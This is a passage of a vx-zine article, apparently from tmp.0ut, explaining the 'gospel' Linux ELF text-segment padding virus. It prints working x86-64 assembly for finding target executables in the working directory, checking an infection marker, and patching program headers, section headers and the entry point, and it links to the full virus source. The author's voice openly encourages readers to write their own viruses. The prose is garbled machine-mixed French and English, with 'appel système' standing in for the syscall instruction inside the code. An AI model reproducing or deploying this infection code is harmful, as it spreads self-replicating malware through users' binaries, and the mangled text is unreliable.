+; r14 + 436 ; vxoffset: dd 0
+; r14 + 440 ; vxshoff: dd 0
+; r14 + 444 ; vx_padding_size: dd 0
+; r14 + 448 ; original_entry_point: dq 0
+;
+; r14 + 500 = # of dirent entries returned from getdents64 appel système 
+;
+;
+;//////////  structure dirent //////////////
+;
+; r14 + 600 =   struc linuxdirent
+; r14 + 600         .d_ino:         resq    1
+; r14 + 608         .d_off:         resq    1
+; r14 + 616         .d_reclen:      resb    2
+; r14 + 618         .d_nameq:       resb    1
+; r14 + 619         .d_type:        resb    1
+; r14 + 620     endstruc
+;
+;
+;////////// ELF Header //////////////
+;
+; r14 + 800 = mmap'd copy of host ELF executable to infect
+; r14 + 800 struc elf_ehdr
+; r14 + 800    .e_ident resd    1 ;ELF sig.,bytes0-3
+; r14 + 804    .ei_class    resb    1 ;ELF class,byte 4
+; r14 + 805    .ei_data resb    1 ;ELF byte 5
+; r14 + 806    .ei_version  resb    1 ;byte 6
+; r14 + 807    .ei_osabi    resb    1 ;byte 7
+; r14 + 808    .ei_abiversion   resb    1 ;byte 8
+; r14 + 809    .ei_padding  resb    6 ;bytes 9-14
+; r14 + 815    .ei_nident   resb    1 ;sizeidentarr,byte15
+; r14 + 816    .e_type  resw    1 ;uint16_t,bytes16-17
+; r14 + 818    .e_machine   resw    1 ;uint16_t,bytes18-19
+; r14 + 820    .e_version   resd    1 ;uint32_t,bytes20-23
+; r14 + 824    .e_entry     resq    1;ElfN_Addr,bytes24-31
+; r14 + 832    .e_phoff     resq    1 ;ElfN_Off,bytes32-39
+; r14 + 840    .e_shoff     resq    1 ;ElfN_Off,bytes40-47
+; r14 + 848    .e_flags     resd    1 ;uint32_t,bytes48-51
+; r14 + 852    .e_ehsize    resb    2 ;uint16_t,bytes52-53
+; r14 + 854    .e_phentsize resb    2 ;uint16_t,bytes54-55
+; r14 + 856    .e_phnum     resb    2 ;uint16_t,bytes56-57
+; r14 + 858    .e_shentsize resb    2 ;uint16_t,bytes58-59
+; r14 + 860    .e_shnum     resb    2 ;uint16_t,bytes60-61
+; r14 + 862    .e_shstrndx  resb    2 ;uint16_t,bytes62-63
+; r14 + 864 endstruc
+;
+;
+;////////// En-têtes de programme ELF //////////////
+;
+; the ELF Program headers will exist as entries in the PHdr table
+; of course, we won't know ahead of time how many entries there are
+; but we do know the offsets to all the fields of each Phdr entry
+; so nous pouvons use those offsets, combined with the elf_ehdr.e_phoff to 
+; calculate the offsets of the fields in each PHdr as we iterate 
+; through them
+;
+; the calculation to each phdr will essentially be:
+; phdr_offset = elf_ehdr.e_phoff + (elf_ehdr.e_phentsize * phent_index)
+; where phent_index is an integer n in the range [0, elf_ehdr.e_phnum]
+; corresponding to the nth Phdr entry
+; I've simplified this in the below offset listings --
+; the below offset listings assume that you are at the 0th PHdr
+; obv adjust accordingly 
+
+; r14 + elf_ehdr.e_phoff + 0    struc elf_phdr
+; r14 + elf_ehdr.e_phoff + 0    .p_type     resd 1  ;uint32_t   
+; r14 + elf_ehdr.e_phoff + 4    .p_flags    resd 1  ;uint32_t   
+; r14 + elf_ehdr.e_phoff + 8    .p_offset   resq 1  ;Elf64_Off  
+; r14 + elf_ehdr.e_phoff + 16   .p_vaddr    resq 1  ;Elf64_Addr 
+; r14 + elf_ehdr.e_phoff + 24   .p_paddr    resq 1  ;Elf64_Addr 
+; r14 + elf_ehdr.e_phoff + 32   .p_filesz   resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_phoff + 40   .p_memsz    resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_phoff + 48   .p_align    resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_phoff + 56   endstruc
+;
+;
+;////////// ELF Section Headers //////////////
+;
+;
+; We can use the same breakdown of offsets that we used above
+; for calculating the offsets of the fields in each of the
+; ELF Section Headers:
+;
+; r14 + elf_ehdr.e_shoff + 0    struc elf_shdr
+; r14 + elf_ehdr.e_shoff + 0    .sh_name    resd 1  ;uint32_t   
+; r14 + elf_ehdr.e_shoff + 4    .sh_type    resd 1  ;uint32_t   
+; r14 + elf_ehdr.e_shoff + 8    .sh_flags   resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_shoff + 16   .sh_addr    resq 1  ;Elf64_Addr 
+; r14 + elf_ehdr.e_shoff + 24   .sh_offset  resq 1  ;Elf64_Off  
+; r14 + elf_ehdr.e_shoff + 32   .sh_size    resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_shoff + 40   .sh_link    resd 1  ;int32_t   
+; r14 + elf_ehdr.e_shoff + 44   .sh_info    resd 1  ;uint32_t   
+; r14 + elf_ehdr.e_shoff + 48   .sh_addralign   resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_shoff + 56   .sh_entsize resq 1  ;uint64_t   
+; r14 + elf_ehdr.e_shoff + 64   endstruc
+;***************************************************************
+```
+
+For our code ingredients, nous pouvons use the algorithm from silvio's paper as a 
+guide, car il décrit la routine d'infection du virus. My implementation of this 
+algorithm follows in [part 2c]. 
+
+Nous avons besoin d'autres routines dans notre virus, comme pour identifier les fichiers 
+cible viables. Cela répond à des questions comme « Comment trouvons-nous même des fichiers à infecter ? » 
+and "How do we verify that each candidate file is a valid target ELF??
+
+Bien sûr, il y a plusieurs façons de procéder avec une routine check_file. Dans ma 
+mise en œuvre, j'ai devisu une approche basée sur les techniques d'œuvres par 
+silvio[1,2], TMZ[14], et elfmaster[13], car ceux-ci étaient les virus que j'ai 
+référencés le plus souvent pendant l'écriture de ce PoC.
+
+Dans ma PoC, pour trouver les fichiers à infecter, gospel fait ce qui suit : 
+
+* Utiliser l'appel système getdents64 pour obtenir les structures dirent du répertoire de travail actuel 
+  courant. 
+
+* Itérer à travers chaque entrée (si getdents64 renvoie une valeur entière positive ; 
+  sinon, oh non) et effectuer des vérifications.
+
+* Après que chaque fichier a été vérifié, il appelle soit la routine d'infection (si 
+  le fichier candidat est un ELF cible valide) ou la routine check_file vérifiera 
+  le fichier dans la structure dirent suivante. It calculates the offset to the next 
+  dirent entry by using the d_reclen field value of the current structure dirent.
+
+Quelles sont les exigences que nous voulons que le fichier que nous vérifions satisfasse ?
+
+Minimel Au-delà de cela, les éléments requis 
+de l'ELF cible seront spécifiques au virus implémenté et au
+système.
+
+Voici les exigences que j'ai utilisées pour déterminer les cibles d'infection ELF valides :
+
+```
+;**********************************************************
+;check_file :
+;   open file -&gt; fstat file (get file size) - &gt; use fstat.size for mmap call & mmap file    
+;   après un mmap réussi, fermer le fichier
+;   utiliser le fichier mappé pour vérifier que le fichier cible satisfait ce qui suit :
+;   1. le fichier cible est un exécutable*
+;   2. le fichier cible est un ELF
+;   3. le fichier cible est un ELF 64 bits
+;   4. l'architecture du fichier cible est x86_64 
+;   5. Le fichier cible n'est ni « . » (répertoire courant) ni « .. » (répertoire parent)
+;   6. le fichier cible n'est pas déjà infecté (vérifier avec une signature à un décalage connu)
+
+;   *Note : nous voulons confirmer qu'un fichier candidat est un fichier régulier et un 
+;  fichier exécutable, pour ne pas perdre du temps à vérifier un dirent qui correspond 
+;  to a courant. Si vous voulez confirmer qu'une cible est un fichier régulier, you 
+;  could check whether curr_d_entry-&gt;d_type == DT_REG but the d_type field is 
+;  est techniquement pas un champ requis dans une structure dirent et bien sûr, 
+;  il n'était pas présent sur ma machine. 
+;
+;  Une autre option est de vérifier un champ dans la structure fstat (après avoir fait un 
+;  appel système fstat bien sûr) : st_mode. Nous pouvons interroger le champ st_mode dans la 
+;  structure stat retournée pour déterminer si le fichier que nous examinons actuellement est
+;  un fichier régulier ; our check will pass when the st_mode field satisfies the 
+;  requirements of S_ISREG. 
+; 
+;  Mais pas si vite ! Si vous codez cela en asm, vous réaliserez que 
+;  S_ISREG est en fait une macro, qui se développe en : 
+;  S_ISREG equ ((stat.st_mode & S_IFMT) == S_IFREG)
+;  où :
+;   S_IFREG     dq 0x0100000   ;regular file
+;   S_IFMT  dq 0x0170000
+; 
+;  Éventuellement, vous pourriez être fatigué d'essayer de définir une macro dans NASM qui 
+;  effectue des opérations binaires sur des entiers de largeurs variées et dires, "putain, on va-y aller." 
+; 
+;  Ici, cela se traduit par : effectuez simplement des vérifications sur Ehdr.e_type. 
+;  Si Ehdr.e_type == 0x0200 (DYN) ou 0x0300 (EXEC) alors cette vérification passe.
+;  Si toutes les conditions ci-dessus sont remplies, appelez la routine d'infection
+;  Sinon, continuez à boucler sur les fichiers restants dans le répertoire
+;
+;***************************************************************
+```
+
+Here is the complete check_file routine from gospel.asm:
+
+```
+check_file :
+    push rcx
+    check_elf:
+        push rcx                    ;preserve rcx before appel système
+        lea rdi, [rcx + r14 + 618]  ;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
+        mov rsi, 0x2                        ;flags - read/write (OPEN_RDWR) in rsi
+        xor rdx, rdx                        ;mode - 0
+        mov rax, 0x2                        ;SYS_OPEN ==0x2
+        appel système
+        pop rcx                     ;restore rcx for dirent offset
+
+        cmp rax, 0
+        jb checknext
+        mov r9, rax
+        push r9
+        mov r8, rax
+        mov [r14 + 144], rax
+        xor r12, r12
+    .copy_filename:
+        lea rdi, [r14 + 200] 
+        lea rsi, [rcx + r14 + 618]
+        mov qword [rdi], rsi
+        xor rax, rax
+        xor r12, r12
+        jmp get_vx_name
+    check_vx_name:
+        pop rsi
+        lea rdi, [r14 + 200]
+        cld
+        .filenameloop:
+            mov byte al, [rsi]
+            cmp byte [rdi], al
+            jne get_filestat
+            inc r12
+            inc rdi
+            inc rsi
+            cmp r12, 5
+            jnz .filenameloop
+        jmp checknext
+    get_vx_name:
+        call check_vx_name
+        vxname: db "gospel",0       
+    get_filestat:
+        lea rsi, [r14]              ;size for mmap == e_shoff + (e_shnum * e_shentsize)
+        mov rdi, r8                 ;retrieve size from structure filestat with an fstat appel système
+        mov rax, 0x5 ;SYS_FSTAT
+        appel système
+;*******************************************************************************
+        ;void *mmap(void addr[.length], size_t length, int prot, int flags,
+        ;                  int r14 + 416, off_t offset);
+;*******************************************************************************
+    mmap_file:
+        xor rdi, rdi            ;set RDI to NULL
+        mov rsi, [r14 + 48]     ;filestat.st_size
+        mov rdx, 0x3            ; (PROT_READ | PROT_WRITE)
+                                ; fd is already in r8 
+        mov r10, 0x2            ; MAP_PRIVATE
+        xor r9, r9              ; offset of 0 within file   
+        mov rax, 0x9            ;SYS_MMAP
+        appel système
+        cmp rax, 0
+        jb checknext
+        pop r9
+        mov r8, rax
+        mov [r14 + 800], rax    ;rax contains addr of ELF hôte mappé
+        push rax
+    close_curr_file:
+        mov rdi, r9
+        mov rax, 0x3            ;SYS_CLOSE
+        appel système
+        pop rax
+        test rax, rax
+        js checknext
+;*******************************************************************************
+;ELF header vals
+;ETYPE_DYN          equ 0x3
+;ETYPE_EXEC         equ 0x2
+;*******************************************************************************
+    check_elf_header_etype:
+        cmp word [rax + 16], 0x0002     ;elf_ehdr.e_type
+        je check_elf_header_magic_bytes
+        cmp word [rax + 16], 0x0003     ;elf_ehdr.e_type
+        je check_elf_header_magic_bytes
+        jnz checknext
+    check_elf_header_magic_bytes:
+        cmp dword [rax], 0x464c457f     ;elf_ehdr.e_ident
+        jnz checknext
+;*******************************************************************************
+;ELF header vals
+;ELFCLASS64         equ 0x2
+;*******************************************************************************
+    check_elf_header_64bit:
+        cmp byte [rax + 4], 0x2
+        jne checknext
+;*******************************************************************************
+;ELF header vals
+;ELFX8664           equ 0x3e
+;*******************************************************************************
+    check_elf_header_arch:
+        cmp byte [rax + 18], 0x3e           ;elf_ehdr.e_machine
+        jne checknext
+    verifie_pas_de_vx_sig:
+        lea r13, [rax + 24]                 ;elf_ehdr.e_entry
+        cmp dword [r13 + 2], 0x786f786f
+        je checknext
+    verifie_deja_infecte:
+        cmp dword [rax + 9], 0x786f786f     ;elf_ehdr.ei_padding
+        je checknext
+    ready2infect:
+        call infect 
+        jmp painting
+    checknext:
+        lea rdi, [r14 + 416]
+        mov rsi, [r14 + 48]             ;filestat.st_size
+        mov rax, 0xB ;SYS_MUNMAP
+        appel système
+
+        pop rcx
+        add cx, [rcx + r14 + 616]       ; linuxdirent.d_reclen
+        cmp qword rcx, [r14 + 500]
+        jl check_file
+```
+
+À ce stade, nous avons une compréhension claire de tous les composants dont nous avons besoin 
+need in order to whip up a PoC for the segment texte padding infection technique 
+et appliquer ce que nous avons appris. Récapitulons nos exigences vx ici :
+
+1. Une implémentation de l'algorithme d'infection
+2. Une routine pour valider qu'un fichier candidat satisfait un ensemble clairement 
+   défini d'exigences pour une cible ELF valide
+3. Une routine pour trouver des fichiers candidats sur le système que nous infecterons avec 
+   notre charge utile de virus 
+4. Deux zones de travail séparées — une zone de travail pour analyser divers 
+   composants dans notre fichier ELF hôte et une zone « d'étalonnage » (fichier temporaire) 
+   où nous construirons progressivement notre ELF hôte+virus infecté final.
+5. Structures de données clairement définies à cibler et utiliser/manipuler
+6. Une charge utile siq
+7. Divers : gestion des erreurs et tout le autre truc ennuyeux + nec. Implémentez à votre 
+  convenance (ou échouez à votre péril)
+
+L'élément #6 dépend du bon sens de l'auteur du virus. Bien sûr, la mise en œuvre 
+de n'importe lequel de ces éléments dépend du bon sens de l'auteur du virus. Do whatever you 
+want. Je vous l'ai dit, je serai juste par ici, boutefie un monstre comme un bon 
+délinquant. À la fin de la journée, j'espère juste que votre vx n'est pas ennuyeux.
+
+L'élément #6 dans mon PoC (gospel) dessine un morceau d'art ASCII à l'écran. For peak 
+spooky daemonic malware witch vibes, j'ai utilisé un script Python pour transformer l'un de 
+mes dessins à l'encre de ma main d'un crâne en un morceau d'art ASCII réduite. Le virus 
+payload of gospel displays this ASCII art skull drawing and then jumps to the 
+saved point d'entrée original de l'ELF hôte. 
+
+
+Partie 2c : Implémentation de l'algorithme d'infection \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+Nous sommes arrivés à la partie la plus savoureuse de notre virus : la routine d'infection.
+As described above, la routine d'infection consistera principalement en deux parties : une 
+routine de correction PHdr et une routine de correction SHdr.
+
+Below is the infection routine from gospel:
+
+```
+;***************************************************************
+routine d'infection gospel
+;***************************************************************
+infect:
+    mov r13, [r14 + 800] ;emplacement sur la pile pour l'adresse sauvegardée de
+                         ;ELF hôte mappé
+    mov r12, [r13 + 32]  ;décalage de la table des en-têtes de programme ELF hôte
+    mov r15, [r13 + 40]  ;décalage de la table des en-têtes de section ELF hôte 
+    mov r8, [r13 + 24]   ;décalage du point d'entrée original de l'ELF hôte
+
+    mov dword [r13 + 9], 0x786f786f 
+    ;chaîne de marqueur d'infection "xoxo" stockée dans elf_ehdr.e_padding
+    
+;***************************************************************
+; Mettre à jour les en-têtes de programme de l'ELF infecté
+;
+; e_phentsize == size of program header entry   
+; size of program header table == e_phnum * e_phentsize
+; vx_offset = offset to start of vx code after insertion into host
+; vx_offset will replace e_entry in ELF header as the 
+; new entry point in infected ELF
+;
+; r13 contains address of mmap'ed host ELF
+; mov r13, [r14 + 800]  
+; emplacement sur la pile pour l'adresse sauvegardée de ELF hôte mappé 
+; r12 contains *offset* within mmap'ed file to PHdr table
+; mov r12, [r13 + 32]    ;décalage de la table des en-têtes de programme ELF hôte
+; we need to increment r12 on each iteration (
+; (where # of iterations == elf_ehdr.e_phnum)
+; we also need to save the original entry point (OEP) of 
+; the host ELF for the final jmp at the end of our vx code
+;
+; For reference, the PHdr patching routine accesses fields in each 
+; entry of the PHdr table using the following schema:
+;[r14 + 800] + elf_ehdr.e_phoff + phdr_field_offset
+; We can simplify it thus:
+; r13 + r12 + 0     struc elf_phdr
+; r13 + r12 + 0     .p_type     resd 1  ;uint32_t   
+; r13 + r12 + 4     .p_flags    resd 1  ;uint32_t   
+; r13 + r12 + 8     .p_offset   resq 1  ;Elf64_Off  
+; r13 + r12 + 16    .p_vaddr    resq 1  ;Elf64_Addr 
+; r13 + r12 + 24    .p_paddr    resq 1  ;Elf64_Addr 
+; r13 + r12 + 32    .p_filesz   resq 1  ;uint64_t   
+; r13 + r12 + 40    .p_memsz    resq 1  ;uint64_t   
+; r13 + r12 + 48    .p_align    resq 1  ;uint64_t   
+; r13 + r12 + 56    endstruc
+;
+;
+;PT_LOAD    equ 0x1
+;PFLAGS_RX  equ 0x5
+;PFLAGS_RW  equ 0x6
+;***************************************************************
+    xor rcx, rcx
+    xor r11, r11
+    mov word cx, [r13 + 56]         ;elf_ehdr.e_phnum
+    check_phdrs:
+        .phdr_loop:
+            push rcx
+            ;check elf_phdr.p_type offset == type PT_LOAD   
+            cmp word [r13 + r12], 0x1           
+            jne .mod_subsequent_phdr
+            .mod_curr_header:
+                ;check elf_phdr.p_flags == PFLAG_R | PFLAG_X            
+                cmp dword [r13 + r12 + 4], 0x5  
+                je .mod_phdr_text_segment           
+                jmp .mod_subsequent_phdr
+
+                .mod_phdr_text_segment:         
+                ; adresse du virus d'entrée (evaddr)= 
+                ; phdr-&gt;p_vaddr + phdr-&gt;p_filesz                
+                ; sauvegarder evaddr à (r14 + 400)
+                ; charger l'adresse d'OEP depuis l'en-tête ELF
+                ; nouveau point d'entrée du fichier infecté = evaddr
+                ; corriger le point d'entrée de l'en-tête ELF vers le début du code vx
+                ; vxoffset = elf_phdr.p_offset+elf_phdr.p_filesz
+                ; sauvegarder vxoffset sur la pile
+                ; phdr.p_filesz += vlen+10(taille du jmp vers OEP)
+                ; phdr.p_memsz += vlen+10(taille du jmp vers OEP)
+    
+                    mov r10, [r13 + r12 + 16]   ;elf_phdr.p_vaddr
+                    add r10, [r13 + r12 + 32]   ;elf_phdr.p_filesz
+                    mov qword [r14 + 400], r10
+                    mov r11, qword [r13 + 24]   
+                    mov qword [r14 + 448], r11  ;save OEP to stack
+                    
+                    mov qword [r13 + 24], r10
+
+                    mov r10, [r13 + r12 + 8]    ;elf_phdr.p_offset  
+                    add r10, [r13 + r12 + 32]   ;elf_phdr.p_filesz
+                    mov dword [r14 + 436], r10d
+
+                    add qword [r13 + r12 + 32], vlen+12
+                    add qword [r13 + r12 + 40], vlen+12 
+                    jmp .next_phdr              
+        
+            .mod_subsequent_phdr:
+            ; load variable from stack corresponding to 
+            ; offset of next segment after .text in host ELF
+            ; check if this variable has already been defined
+            ; in a previous loop iteration 
+            ; (check if next_segment_offset == 0)
+            ; otherwise, move offset of curr segment to that var
+            ; because based on checks up to this point, we know
+            ; that r11 contains offset of next segment after .text 
+            ; segment, in host ELF 
+            ;
+                xor r11, r11
+                mov r11d, [r14 + 436]
+                cmp r11d, 0
+                je .next_phdr
+                mov r10, [r13 + r12 + 8]        ;elf_phdr.p_offset  
+                cmp r10, qword [r14 + 400]
+                jl .next_phdr
+                add dword r10d, [PAGESIZE]
+                mov [r13 + r12 + 8], r10        ;elf_phdr.p_offset
+                xor r10, r10
+                mov r10, qword [r14 + 424]
+                cmp r10, 0
+                jne .next_phdr
+                mov qword [r14 + 424], r11
+        .next_phdr:
+            pop rcx
+            dec cx 
+            ;add elf_ehdr.e_phentsize to phdr offset in r12
+            add r12w, word [r13 + 54] 
+            cmp cx, 0
+            jg .phdr_loop
+    mov dword [r14 + 432], r12d
+
+;***************************************************************
+;   Maintenant corriger les en-têtes de section de l'ELF infecté:
+; Nous utiliserons un schéma très similaire à celui utilisé dans la 
+; routine de correction PHdr ci-dessus pour notre routine de correction SHdr, 
+; avec quelques modifications.
+;   
+; r13 contains address of mmap'ed host ELF
+; mov r13, [r14 + 800]  
+; location on stack for saved address returned from mmap appel système
+; r15 contains *offset* within mmap'ed file to SHdr table
+; mov r15, [r13 + 40] ;décalage de la table des en-têtes de section ELF hôte
+; 
+; we need to increment r15 on each iteration 
+; (where # of iterations == elf_ehdr.e_shnum)
+; At the 0th iteration, r15 contains the offset of 
+; the 0th Section Header in the SHdr Table
+; 
+; We can use our schema from our stack layout for computing 
+; offsets to different SHdr fields:
+;[r14 + 800] + elf_ehdr.e_shoff + shdr_field_offset
+; And simplify it thus:
+;
+; r13 + r15 + 0     struc elf_shdr
+; r13 + r15 + 0     .sh_name    resd 1  ;  uint32_t   
+; r13 + r15 + 4     .sh_type    resd 1  ;  uint32_t   
+; r13 + r15 + 8     .sh_flags   resq 1  ;  uint64_t   
+; r13 + r15 + 16    .sh_addr    resq 1  ;  Elf64_Addr 
+; r13 + r15 + 24    .sh_offset  resq 1  ;  Elf64_Off  
+; r13 + r15 + 32    .sh_size    resq 1  ;  uint64_t   
+; r13 + r15 + 40    .sh_link    resd 1  ; uint32_t   
+; r13 + r15 + 44    .sh_info    resd 1  ; uint32_t   
+; r13 + r15 + 48    .sh_addralign   resq 1  ; uint64_t   
+; r13 + r15 + 56    .sh_entsize resq 1  ; uint64_t   
+; r13 + r15 + 64    endstruc
+;
+;***************************************************************
+    xor r10, r10
+    xor r11, r11
+    xor rcx, rcx
+    mov word cx, [r13 + 60]             ;elf_ehdr.e_shnum
+    check_shdrs:
+        .shdr_loop:
+            push rcx
+            mov r11, [r13 + r15 + 24]       ;elf_shdr.sh_offset
+            cmp dword r11d, [r14 + 436]
+            jge .mod_subsequent_shdr
+            jl .check_for_last_text_shdr
+            .check_for_last_text_shdr:
+                mov r11, [r13 + r15 + 16]       ;elf_shdr.sh_addr
+                add r11, qword [r13 + r15 + 32] ;elf_shdr.sh_size
+                cmp r11, qword [r14 + 400]
+                jne .next_shdr
+            .mod_last_text_section_shdr:
+                mov r10, [r13 + r15 + 32]       ;elf_shdr.sh_size
+                add dword r10d, vlen
+                mov [r13 + r15 + 32], r10       ;elf_shdr.sh_size
+                jmp .next_shdr
+            .mod_subsequent_shdr:
+                mov r11, [r13 + r15 + 24]       ;elf_shdr.sh_offset
+                add dword r11d, [PAGESIZE]
+                mov dword[r13 + r15 + 24],r11d ;elf_shdr.sh_offset
+        .next_shdr:
+            pop rcx
+            dec cx
+            ;add elf_ehdr.e_shentsize to shdr offset in r15 
+            add r15w, word [r13 + 58]   
+            cmp cx, 0
+            jg .shdr_loop
+    ;mov original elf_ehdr.e_shoff to r11
+    ;and save original e_shoff to var on stack
+    mov r11, [r13 + 40]                 ;elf_ehdr.e_shoff
+    mov qword [r14 + 408], r11      ;original shoff
+    .patch_ehdr_shoff:
+        add dword r11d, [PAGESIZE]
+        mov qword [r13 + 40], r11   ;patch elf_ehdr.e_shoff
+        mov dword [r14 + 440], r11d
+        jmp frankenstein_elf
+```
+
+Partie 2d : Preuve de concept (PoC) \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+The accompanying PoC for this article is my implementation of the segment texte 
+technique de virus de remplissage de segment texte, écrite en asm x86-64. Il infecte les exécutables ELF PIE x86-64 
+the current working courant. Le fichier infecté exécutera la charge utile du virus — 
+en imprimant un dessin de crâne ASCII sur stdout — puis retourner au OEP et exécuter 
+le code ELF hôte. 
+
+Code source : https://tmpout.sh/3/Linux.gospel.asm
+
+Le code source, ainsi que les copies des références d'archives 29a pour cet article, 
+sont également disponibles sur le repo GitHub ici : 
+https://github.com/ic3qu33n/gospel-for-a-new-epoch/tree/main 
+
+
+Part 2e: où est mon polymorphismee uwu ///////////////////////////////////////////
+
+
+L'obstacle principal pour transformer la version actuelle de Linux.gospel.asm en 
+polymorphic virus is the permissions used for the .segment texte in an ELF — 
+lesquelles seront mappées sur une page avec des Permissions RX mais pas RW. 
+Nous ne pourrons pas insérer du code auto-modifiant dans cette page sans modifier 
+the permissions of the .segment texte in the infected ELF. This would look 
+suspicious and that's not a cute look for us. 
+
+The RX page permissions of the mapped .segment texte and its limitations for 
+le stockage/sauvegarde des variables a créé certaines difficultés initiales. Dans ma PoC, le virus 
+doit stocker des variables qui ne seront pas définies avant l'exécution. Without the 
+use of a .data or .bss segment, (que nous voulons éviter) nous devons stocker toutes les 
+variables sur la pile.
+
+Une meilleure option pour écrire un virus polymorphe est d'utiliser un segment avec RW 
+Permissions en tant que région cible pour injecter du code de virus. The .segment de données is 
+a good candidate for cela. Un auteur de virus pourrait même utiliser une autre des techniques de Silvio 
+techniques as a guide: the .segment de données infection technique.
+
+Peut-être si quelqu'un est ainsi disponible, ils pourraient écrire un virus qui divise sa 
+payload and combines the segment texte padding infection technique with the 
+segment de données infection technique. Mais c'est un virus pour une autre fois.
+
+
+Partie 3 : Une touche de LiME //////////////////////////////////////////////////////
+
+
+Nous sommes arrivés à la section pénultième de notre article. Félicitations pour 
+avoir réussi jusque là. En guise de récompense, in addition to your party favor (don't forget 
+your goodie bag with the Linux vx I wrote 4 u! Don't forget your hat or your 
+gloves! Tu veux que je t'emballe un Tupperware avec des restes ? Bien sûr 
+que tu veux.) il y a une surprise spéciale juste pour toi : une brève introduction à 
+vx Linux polymorphe et métamorphique ancien. Cette série d'articles est intitulée 
+"u used to call me on my polymorphic shell phone" après tout. 
+
+Donc, dans l'esprit de Drake qui prélève des artistes de hip-hop anciens des 
+'90s/early 2000s, nous allons prélever de Benny, du Mental Driller et 
+zhugejin et leurs œuvres des années 1990/début 2000. I use the term "sampling" 
+here to draw an important distinction: tout comme le travail de Ms. Lauryn Hill 
+se tient seul, mérite le temps et l'attention d'une écoute dédiée et 
+récompense un auditeur qui plonge après avoir entendu un hook dans « Nice for What » 
+(comme quiconque a écouté « The Miseducation of Lauryn Hill » en boucle 
+pendant des mois me dirait), ainsi que les œuvres référencées dans cet article 
+méritent d'être lues dans leur intégralité. This article "samples" these works to provide 
+an introduction, mais n'est en aucun cas une examination exhaustive ou détaillée des 
+travaux eux-mêmes. Le lecteur est encouragé à explorer ces œuvres et à les lire 
+intégralement. The reader is also encouraged to listen to "The Miseducation of Lauryn 
+Hill."
+
+                                       //                                       
+
+Les œuvres que nous allons creuser exemplifient deux types différents de 
+écriture de virus polymorphe :
+
+[10] "Linux Mutation Engine (source code) [LiME] Version: 0.2.0," écrit par 
+     zhugejin à Taipei, Taïwan ; Date : 2000/10/10, 
+     Dernière mise à jour : 2001/02/28, numéro 29A #6
+
+[11] "Win32/Linux.Winux", by Benny/29A, 29A issue #6
+
+[12] "Metamorphism in practice or How I made MetaPHOR and what I've learnt", 
+     by The Mental Driller/29A, 29A issue #6
+
+While [12] is not strictly a Linux vx article, the flexibility of the code (it's 
+a metamorphic engine after all) lends itself to what the author describes as a 
+"Multi-platform cross-infector." To flesh out this term a bit more, here's the 
+Mental Driller's explication[re: "Multi-platform cross-infector."], "That's 
+something that I didn't do on the release 1.0 of MetaPHOR because I was short 
+of time to finish it for 29A#6, but it's quite easy (in fact, we have seen the 
+proof of concept in Benny's Winux). We only have to call one API function or 
+another, depending on the system we are running, and have a function to attach 
+our mutated code to a PE or to an ELF."
+
+The careful reader will note that the third article deals with *métamorphisme* 
+et non de *polymorphismee.* This isn't a hair-splitting distinction — it is an 
+important and marked one. Cependant, pour comprendre le métamorphisme, we must 
+build up to it with polymorphisme. 
+
+Commençons donc par là. And then nous progresserons jusqu'au métamorphisme...
+
+[To be continued in the next tmp.0ut...]
+
+
+Un toast aux nouveaux débuts //////////////////////////////////////////////////////
+
+
+Il est temps pour nous de remettre nos cadavres de vx dans leurs cASICA et dans le 
+congélateur. Nous avons terminé notre étude pour la journée et nous voulons garder notre virus 
+corps bien préservés. Nous reviendrons avec plus dans notre prochaine morgue de vx da Vinci 
+excursion. J'espère que vous avez pris des notes pendant ce temps. Il n'y a pas de 
+garantie que je serai là pour vous guider la prochaine fois que vous aurez envie de 
+étudier les internes de ELF. 
+
+Très bien, Je vous laisse avec quelques techniques que j'utilise pour me retrouver 
+quand les choses vont de travers dans l'écriture de vx. Il y a beaucoup de choses qui bougent dans la nuit 
+par là-bas dans l'~*cyberspace*~ effrayant, il vaut mieux que vous vous fassiez des 
+amis avec vos démons maintenant :
+
+Que vous cherchiez un itinéraire vers des structures anatomiques humaines ou un 
+itinéraire vers un virus magnifique, sometimes the only way forward is to create your 
+own. 
+
+En chemin, il y aura des os brisés et des opérations secrètes entreprises dans 
+la nuit. And as you cher lecteur, essuyez-vous la poussière une autre fois, after 
+making a foray of missteps and pitfalls, et vous vous sentez perdu et 
+égaré entre le mausolée et l'obélisque, se demandant si c'est worth it 
+de continuer à trébucher dans la boue, I offer you this: look for the footsteps 
+of those who traversed these paths before you, and let them be your guide, 
+suivez-les avec un esprit ouvert et votre conviction pour ce que vous avez cherché à trouver. 
+La connaissance et la perspective des premiers écrivains de vx Unix/Linux sont intemporelles et 
+peuvent vous mener à des avancées et de nouvelles idées dans votre propre travail.  
+
+Un virus, comme toute œuvre d'art, has power both to wreak havoc and to be goddamn 
+beautiful; un virus peut être effrayant ou malin ou charmant ou sinistre ou 
+inspirant ou stimulant la réflexion ou tout cela, mais, par-dessus tout, a virus 
+*jamais* être ennuyeux. 
+
+
+Cadeaux de fête ///////////////////////////////////////////////////////////////////
+
+
+Inclus dans ce repo GitHub est une playlist pour accompagner cet article, itself 
+aptly titled "gospel for a new epoch." Cette playlist est une 
+projet collaboratif entre moi et Travis Goodspeed. Travis a été assez gentil pour 
+rendre le repo public pour que vous puissiez également profiter des délices des 
+tunes spirituels pour le punk rock ne'er do well et le cosmiquement fou.
+
+Écoutez ces morceaux pendant que vous écrivez votre propre vx Linux :
+https://github.com/travisgoodspeed/lighthouselobsters/tree/master/gospel
+
+k c'est tout pour l'instant
+luv you all so much
+xoxo
+ic3qu33n
+
+Code source complet : <a href="./Linux.gospel.asm">Linux.gospel.asm</a>
+
+
+Salutations /////////////////////////////////////////////////////////////////////////
+
+
+Toute l'équipe tmp.0ut pour le support/les commentaires/les sessions de débogage. 
+richinseattle, elfmaster, TMZ, B3nny, MalcolmVX, et tout le monde au vc 
+appels de débogage pour être rad 3 
+
+Un grand merci spécial à netspooky et sblip pour tout leur 
+support et commentaires sur ce projet ! 
+Travis Goodspeed 
+Silvio (Silvio if you read this then, hello! I love your work!)
